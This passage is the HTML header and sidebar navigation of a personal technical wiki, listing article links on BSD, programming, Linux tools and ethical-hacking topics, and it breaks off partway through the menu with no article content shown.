<!doctype html><html lang=en-us><head><meta charset=utf-8><title>Misc | Tech Notebook</title>
<meta name=viewport content="width=device-width,initial-scale=1"><meta name=keywords content="Documentation,Hugo,Hugo Theme,Bootstrap"><meta name=author content="Colin Wilson - Lotus Labs"><meta name=email content="support@aigis.uk"><meta name=website content="https://lotusdocs.dev"><meta name=Version content="v0.1.0"><link rel=icon href=https://wiki.deimos.fr/favicon.ico sizes=any><link rel=icon type=image/svg+xml href=https://wiki.deimos.fr/favicon.svg><link rel=apple-touch-icon sizes=180x180 href=https://wiki.deimos.fr/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=https://wiki.deimos.fr/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=https://wiki.deimos.fr/favicon-16x16.png><link rel=manifest crossorigin=use-credentials href=https://wiki.deimos.fr/site.webmanifest><meta property="og:title" content="Misc"><meta property="og:description" content="My tech notebook for all things related to technology, programming, and more."><meta property="og:type" content="website"><meta property="og:url" content="https://wiki.deimos.fr/docs/misc/misc/"><meta property="og:image" content="https://wiki.deimos.fr/opengraph/card-base-2_hu_e3fdcf38cadf03e7.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://wiki.deimos.fr/opengraph/card-base-2_hu_e3fdcf38cadf03e7.png"><meta name=twitter:title content="Misc"><meta name=twitter:description content="My tech notebook for all things related to technology, programming, and more."><link rel=alternate type=application/atom+xml title="Atom feed for Tech Notebook" href=/index.xml><script>(()=>{var t=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,e=localStorage.getItem("theme");t&&e===null&&(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")),t&&e==="dark"&&document.documentElement.setAttribute("data-dark-mode",""),e==="dark"&&document.documentElement.setAttribute("data-dark-mode","")})()</script><script type=text/javascript src=https://wiki.deimos.fr/docs/js/flexsearch.bundle.min.f5159d5a2151ffbb653996ec17eaff7da4e04c286bd879fc41839d36a5586f3f20eaead0b6089de48f9adc669cdee771.js integrity=sha384-9RWdWiFR/7tlOZbsF+r/faTgTChr2Hn8QYOdNqVYbz8g6urQtgid5I+a3Gac3udx crossorigin=anonymous></script><link rel=stylesheet href=/docs/scss/style.min.0e29616245601943bd7b42188227b38297c25dd76fb6bc1b872adac3815960610b5ec8bc06e0893810c56e3cedd6c9da.css integrity=sha384-DilhYkVgGUO9e0IYgiezgpfCXddvtrwbhyraw4FZYGELXsi8BuCJOBDFbjzt1sna crossorigin=anonymous></head><body><div class=content><div class="page-wrapper toggled"><nav id=sidebar class=sidebar-wrapper><div class=sidebar-brand><a href=/ aria-label=HomePage alt=HomePage><svg id="Layer_1" viewBox="0 0 250 250"><path d="m143 39.5c-18 0-18 18-18 18s0-18-18-18H22c-2.76.0-5 2.24-5 5v143c0 2.76 2.24 5 5 5h76c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h76c2.76.0 5-2.24 5-5V44.5c0-2.76-2.24-5-5-5h-85zM206 163c0 1.38-1.12 2.5-2.5 2.5H143c-18 0-18 18-18 18s0-18-18-18H46.5c-1.38.0-2.5-1.12-2.5-2.5V69c0-1.38 1.12-2.5 2.5-2.5H98c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h51.5c1.38.0 2.5 1.12 2.5 2.5v94z" style="fill:#06f"/></svg></a></div><div class=sidebar-content style="height:calc(100% - 131px)"><ul class=sidebar-menu><li><a class=sidebar-root-link href=https://wiki.deimos.fr/home/><i class="material-icons me-2">circle</i>
cd ~</a></li><li class=sidebar-dropdown><button class=btn>
<i class="material-icons me-2">article</i>
BSD</button><div class=sidebar-submenu><ul><li class="sidebar-dropdown nested"><button class=btn>
Filesystems</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/MFS_:_Utiliser_un_filesystem_en_RAM/>MFS: Using a RAM Filesystem</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Montage_d%27un_filesystem_%C3%A0_plusieurs_endroits_simultan%C3%A9es/>Mounting a Filesystem in Multiple Places Simultaneously</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Kernel</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Activer_le_port_s%C3%A9rie_sous_FreeBSD/>Activating the Serial Port on FreeBSD</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Activer_modules_son_kernel/>Activating Kernel Modules</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Modifier_son_kernel_g%C3%A9n%C3%A9rique/>Modifying Your Generic Kernel</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Misc</button><div class=sidebar-submenu><ul><li class="sidebar-dropdown nested"><button class=btn>
FreeBSD</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Installation_FreeBSD_sur_ZFS/>Installing FreeBSD on ZFS</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Monitorer_la_temperature_des_processeurs_sous_FreeBSD/>Monitoring CPU Temperature on FreeBSD</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Cr%C3%A9er_un_Apple_Time_Machine_r%C3%A9seaux_sous_FreeBSD/>Creating an Apple Time Machine Network on FreeBSD</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
OpenBSD</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Modifier_les_param%C3%A8tres_de_boot/>Modifying Boot Parameters</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Guide_de_configuration_d%27OpenBSD_%5C%28Tr%C3%A8s_complet%5C%29/>OpenBSD Configuration Guide (Very Complete)</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/R%C3%A9cup%C3%A9rer_son_OpenBSD_apr%C3%A8s_une_mauvaise_manip/>Recovering your OpenBSD after a bad manipulation</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Le_syst%C3%A8me_de_Packages_OpenBSD/>OpenBSD Package System</a></li></ul></div></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Migration_:_Migrer_des_comptes_linux_vers_BSD/>Migration: Migrating Linux accounts to BSD</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Network</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Configurer_le_r%C3%A9seau_sous_NetBSD/>Configure Network on NetBSD</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Configurer_le_r%C3%A9seau_sous_FreeBSD/>Configuring Network on FreeBSD</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/UFS_:_utilisation_des_disques_en_UFS/>UFS: Disk usage in UFS</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/VLAN_:_Cr%C3%A9er_une_interface_VLAN_sous_OpenBSD/>VLAN: Creating a VLAN Interface on OpenBSD</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Configurer_le_r%C3%A9seau_sous_OpenBSD/>Configure Network on OpenBSD</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Trunking_:_Cr%C3%A9er_du_trunking_%28bonding%29_sur_OpenBSD/>Trunking: Creating Trunking (bonding) on OpenBSD</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Statistiques_sur_la_bande_passante_occup%C3%A9e/>Bandwidth Usage Statistics</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Faire_de_la_QOS_%28Quality_Of_Service%29_avec_PF/>QoS (Quality Of Service) with PF</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Packages</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Le_syst%C3%A8me_de_Packages_FreeBSD/>FreeBSD Package System</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Security</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Encrypter_sa_swap/>Encrypting Swap Partition</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Jailctl_:_Cr%C3%A9ation_de_chroot_%28jails%29/>Jailctl: Creating Chroot Environments (Jails)</a></li></ul></div></li></ul></div></li><li class=sidebar-dropdown><button class=btn>
<i class="material-icons me-2">dns</i>
Coding</button><div class=sidebar-submenu><ul><li class="sidebar-dropdown nested"><button class=btn>
HTML</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Introduction_au_XHTML/>Introduction to XHTML</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/CSS_:_Les_feuilles_de_style/>CSS: Style Sheets</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Les_caract%C3%A8res_sp%C3%A9ciaux/>Special Characters</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Mise_en_forme_du_texte/>Text Formatting</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Java</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/gestion_de_la_memoire_en_java/>Java Memory Management</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Debugger_un_crash_de_JVM/>Debugging a JVM Crash</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Perl</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Introduction_%C3%A0_Perl/>Introduction to Perl</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/La_programmation_orient%C3%A9e_objet_en_Perl/>Object-Oriented Programming in Perl</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Mes_scripts_Perl_qui_peuvent_servir_d%27exercices/>My Perl Scripts That Can Serve as Exercises</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/apprendre-le-perl-6/>Learning Perl 6</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
PHP</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Compiler_vos_scripts_PHP/>Compile Your PHP Scripts</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Introduction_au_PHP/>Introduction to PHP</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/S%C3%A9curiser_ses_scripts_PHP/>Securing PHP Scripts</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Python</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Mes_scripts_Python_qui_peuvent_servir_d%27exercices/>My Python Scripts That Can Serve as Exercises</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Introduction_au_Python/>Introduction to Python</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Shell script</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Introduction_au_Script_Shell/>Introduction to Shell Scripting</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Les_diff%C3%A9rentes_boucles_du_shell_script/>Different Shell Script Loops</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Debugger_un_script_shell/>Debugging a Shell Script</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
SQL</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Introduction_au_PowerShell/>Introduction to PowerShell</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
SQL</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Introduction_au_SQL/>Introduction to SQL</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
C</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Introduction_au_C/>Introduction to C</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Quelques_exemples_d%27utilisation_de_CMake/>Some examples of CMake usage</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Mieux_conna%C3%AEtre_et_utiliser_le_pr%C3%A9processeur_du_langage_C/>Better Understanding and Using the C Language Preprocessor</a></li></ul></div></li></ul></div></li><li class=sidebar-dropdown><button class=btn>
<i class="material-icons me-2">dns</i>
Ethical Hacking</button><div class=sidebar-submenu><ul><li class="sidebar-dropdown nested"><button class=btn>
Database</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Les_injections_SQL/>SQL Injections</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Misc</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Protection_de_l%27espace_d%27adressage_:_%C3%A9tat_de_l%27art_sous_Linux_et_OpenBSD/>Address Space Protection: State of the Art in Linux and OpenBSD</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Tests_d%27intrusion/>Penetration Testing</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Network</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Grimwepa%5C_:_le_hack_wifi_facile/>Grimwepa: Easy WiFi Hacking</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Canaux_cach%C3%A9s_%5C%28ou_furtifs%5C%29/>Hidden (or Covert) Channels</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/PSAD_:_protection_contre_les_scans_de_type_nmap/>PSAD: Protection Against nmap-Type Scans</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Scapy_:_Trames_et_paquets_de_donn%C3%A9es/>Scapy: Data Frames and Packets</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Man_In_The_Middle/>Man in the Middle</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Reverse_Engineering_avec_LD_PRELOAD/>Reverse Engineering with LD_PRELOAD</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/arp-spoofing-dans-un-reseau-switche/>ARP Spoofing in a Switched Network</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/alteration-de-tables-arp/>Altering ARP Tables</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Operating Systems</button><div class=sidebar-submenu><ul><li class="sidebar-dropdown nested"><button class=btn>
Linux</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/anti-forensics-sur-systemes-de-fichiers-ext2-ext3/>Anti-forensics on ext2/ext3 Filesystems</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Windows</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Trouver_les_mots_de_passe_de_la_base_SAM_de_Windows/>Finding passwords from the Windows SAM database</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Injection_et_ex%C3%A9cution_de_code_arbitraire_dans_l%5C%27espace_m%C3%A9moire_d%5C%27un_autre_processus/>Arbitrary Code Injection and Execution in Another Process Memory Space</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/La_Technique_de_l%5C%27Attaque_Shatter/>Shatter Attack Technique</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Fuzzing_-_Tutoriel_sur_l%27utilisation_et_la_personnalisation_d%27un_Fuzzer_pour_la_recherche_de_failles/>Fuzzing - Tutorial on Using and Customizing a Fuzzer for Vulnerability Research</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Download_and_Execute_ShellCode_:_Code_optimis%C3%A9_et_d%C3%A9taill%C3%A9_d%5C%27un_ShellCode_Download/Execute_pour_Windows/>Download and Execute ShellCode: Optimized and Detailed Code of a Download/Execute ShellCode for Windows</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Trouver_l%27adresse_de_base_de_kernel32.dll_:_Trois_m%C3%A9thodes_PEB,_SEH_et_TopStack/>Finding the base address of kernel32.dll: Three methods PEB, SEH and TopStack</a></li></ul></div></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Audits_de_s%C3%A9curit%C3%A9_du_protocole_DNS/>DNS Protocol Security Audits</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Theory</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Cryptologie_et_nombres_premiers:_l%27algorithme_RSA/>Cryptology and Prime Numbers: The RSA Algorithm</a></li></ul></div></li></ul></div></li><li class=sidebar-dropdown><button class=btn>
<i class="material-icons me-2">article</i>
Linux</button><div class=sidebar-submenu><ul><li class="sidebar-dropdown nested"><button class=btn>
Applications</button><div class=sidebar-submenu><ul><li class="sidebar-dropdown nested"><button class=btn>
OpenSSH</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/FAQ_OpenSSH/>OpenSSH FAQ</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Belier_:_script_your_SSH_connection/>Belier: Script Your SSH Connection</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Outrepasser_les_proxy_HTTPS_pour_SSH/>Bypassing HTTPS Proxies for SSH</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Faire_du_reverse_Tunelling_avec_OpenSSH/>Reverse Tunneling with OpenSSH</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Cr%C3%A9er_un_VPN_avec_OpenSSH/>Creating a VPN with OpenSSH</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Chrooter_des_comptes_SSH/>Chroot SSH Accounts</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Mise_en_place_d%27un_serveur_de_rebond_pour_ses_connections_SSH/>Setting up an SSH Bouncer Server for Your SSH Connections</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Securiser_OpenSSH/>Securing OpenSSH</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/fanout-run-same-command-on-multiple-machines/>Fanout: Run the Same Command on Multiple Machines Simultaneously</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Shell</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Sed_%5C&_Awk_:_Quelques_exemples_de_ces_merveilles/>Sed & Awk: Some Examples of These Wonders</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Jobs_:_Utilisation_des_jobs/>Jobs: How to Use Jobs</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Cpulimit:_limit_CPU_usage/>Cpulimit: Limit CPU Usage</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Tmux_:_le_multiplexeur_de_terminal_rempla%C3%A7ant_de_screen/>Tmux: The Terminal Multiplexer Replacing Screen</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Screen_:_Les_commandes_les_plus_utilis%C3%A9es/>Screen: Most Used Commands</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Rediriger_l%5C%27output_d%5C%27un_service_vers_un_fichier/>Redirect a Service Output to a File</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/La_commande_find_ou_la_puissance_de_la_recherche/>The find command or the power of search</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Ex%C3%A9cuter_des_commandes_au_logout/>Execute Commands at Logout</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/ZSH_:_un_shell_tr%C3%A8s_pratique/>ZSH: A Very Practical Shell</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Date_:_utilisation_avanc%C3%A9e_de_la_commande_date/>Date: Advanced Usage of the Date Command</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Trouver_des_liens_symboliques_cass%C3%A9s/>Finding Broken Symbolic Links</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Suppression_des_%C3%A9l%C3%A9ments_superflus_dans_un_fichier_texte/>Removing Superfluous Elements in Text Files</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Renommer_en_masse_des_%C3%A9l%C3%A9ments/>Batch Renaming Elements</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Liste_des_commandes_les_plus_utilis%C3%A9es/>Most Used Commands List</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Chatter_avec_les_personnes_connect%C3%A9_sur_une_m%C3%AAme_machine_via_terminal/>Chat with Users on the Same Machine via Terminal</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Trouver_toutes_les_d%C3%A9pendances_li%C3%A9es_%C3%A0_un_package/>Find all dependencies related to a package</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/find-and-du-locate-large-files-and-directories/>Locate Large Files and Directories</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Pstree_:_lister_ses_process_sous_forme_d%27arbre/>Pstree: List Processes as a Tree</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Comment_tuer_une_application_qui_a_plant%C3%A9,_ou_comment_faire_face_%C3%A0_un_%C3%A9cran_%C2%AB_fig%C3%A9_%C2%BB_%5C?/>How to Kill a Crashed Application or Handle a Frozen Screen</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Unix_Toolbox_:_Toutes_les_commandes_utiles/>Unix Toolbox: All Useful Commands</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Diff%C3%A9rences_entre_du_et_df/>Differences between du and df</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Graver_en_ligne_de_commandes/>Command-line Burning</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Motd_:_Modification_du_message_d%27ouverture_de_console/>MOTD: Modifying the Console Opening Message</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Xterm_:_personnaliser_l%27affichage/>Xterm: Customizing the Display</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/fifo-and-cat-share-session-with-multiple-users/>Fifo and Cat: Share a Session with Multiple Users</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Kill_et_lsof_:_Tuer_le_processus_%C3%A9coutant_sur_le_port_voulu/>Kill and lsof: Killing the process listening on a specific port</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Ivconv_:_Transcodage_de_texte_vers_n%27importe_quel_jeu_de_caract%C3%A8res/>Ivconv: Text Transcoding to Any Character Set</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Env_:_variables_d%27environnements/>Environment Variables</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Colorisations_dans_les_consoles/>Console Colorization</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Sipcalc_:_Calculateur_de_sous_r%C3%A9seaux/>Sipcalc: Subnet Calculator</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Shell_:_renommer_en_masse_avec_compteur/>Shell: Batch Renaming with Counter</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Text Editors</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Vim_:_Les_indispendables_&_Quick_Reference_Card/>Vim: Essential Commands & Quick Reference Card</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Vim_:_Les_indispendables_&_Quick_Reference_Card/>Vim: Essential Commands and Quick Reference Card</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Initiation_%C3%A0_Vi/>Introduction to Vi</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Emacs_:_Quick_Reference_Card/>Emacs: Quick Reference Card</a></li></ul></div></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Yubikey_:_Configure_your_yubikey_with_pam/>Yubikey: Configure Your Yubikey with PAM</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/MFi:_install_a_Ubiquiti_server_to_manage_powerstrips/>MFi: Install a Ubiquiti server to manage powerstrips</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/ZNC:_use_a_bouncer_to_get_history/>ZNC: Use a Bouncer to Get History</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Cpuburn_:_stresser_son_CPU/>CPUBurn: Stress Testing Your CPU</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Weechat_:_a_user_friendly_IRC_client/>Weechat: A User Friendly IRC Client</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Gnuplot_:_grapher_des_donn%C3%A9es_facilement/>Gnuplot: Graph Data Easily</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Crontab_:_utilisation/>Crontab: Usage</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Planifier_des_t%C3%A2ches/>Task Scheduling</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/aspirer-un-site-web/>Mirroring a Website</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/BusyBox_:_Cr%C3%A9ation_et_utilisation_d%27une_BusyBox/>BusyBox: Creation and Usage of a BusyBox</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/FTP_:_Automatiser_des_transferts/>FTP: Automate Transfers</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Linux-Unix_cheat_sheets_-_The_ultimate_collection/>Linux-Unix Cheat Sheets - The Ultimate Collection</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Red%C3%A9marrer_certains_services_difficiles/>Restarting difficult services</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Coding & Debug</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Patchs_:_Cr%C3%A9ation_et_applications_de_patchs/>Patches: Creating and Applying Patches</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Strace_et_Ltrace_:_tracez_les_appels_syst%C3%A8mes_et_librairies/>Strace and Ltrace: Trace System and Library Calls</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Probl%C3%A8mes_de_locales_avec_Perl/>Perl Locale Issues</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/G%C3%A9n%C3%A9rer_un_fichier_configure_pour_pr%C3%A9-make/>Generate a Configure File for Pre-make</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Compilations_foireuses/>Failed Compilations</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Desktop</button><div class=sidebar-submenu><ul><li class="sidebar-dropdown nested"><button class=btn>
VNC</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Vino_:_le_serveur_VNC_par_excellence_pour_gnome/>Vino: The VNC Server of Excellence for GNOME</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/VNC_:_Mode_Listen_sous_Linux/>VNC: Listen Mode on Linux</a></li></ul></div></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Infinality_fonts_for_retina_display/>Infinality fonts for retina display</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/How_to_install_and_configure_a_monitoring_machine_for_supervision/>How to install and configure a monitoring machine for supervision</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Awesome_:_un_bureau_l%C3%A9ger_et_puissant/>Awesome: A Lightweight and Powerful Desktop</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Synergy_:_Multi_screens_avec_plusieurs_ordinateurs/>Synergy: Multi-screen Setup with Multiple Computers</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Gnome-shell_:_utilisation_de_settings_pour_configurer_votre_desktop/>GNOME Shell: Using Settings to Configure Your Desktop</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Gnome-shell_:_changement_automatique_de_fond_d%27%C3%A9cran/>Gnome-shell: Automatic Wallpaper Change</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Zenity_:_Du_GUI_pour_vos_scripts_simplement/>Zenity: GUI for Your Scripts Easily</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/D%C3%A9sactiver_le_son_sous_GDM/>Disable Sound in GDM</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Gnome_:_Tableaux_de_bord_verrouill%C3%A9s/>Gnome: Locked Dashboards</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Xmodmap_:_mapper_tous_les_boutons_de_sa_souris/>Xmodmap: Map All Your Mouse Buttons</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Couper_le_bip_de_l%27UC/>Disable the PC Speaker Beep</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/redemarrer_x/>Restart X</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Utiliser_le_pav%C3%A9_num%C3%A9rique_comme_souris_avec_X/>Using the Numeric Keypad as a Mouse with X</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Wacom_:_Mise_en_place_de_la_Wacom_Bamboo/>Wacom: Setting up the Wacom Bamboo</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Exporter_un_display_ou_forwarder_une_connexion_X11/>Export a Display or Forward an X11 Connection</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Numlockx_:_Activer_le_pav%C3%A9_num%C3%A9rique_au_boot/>Numlockx: Enabling the numeric keypad at boot</a></li><li><a class=sidebar-nested-link 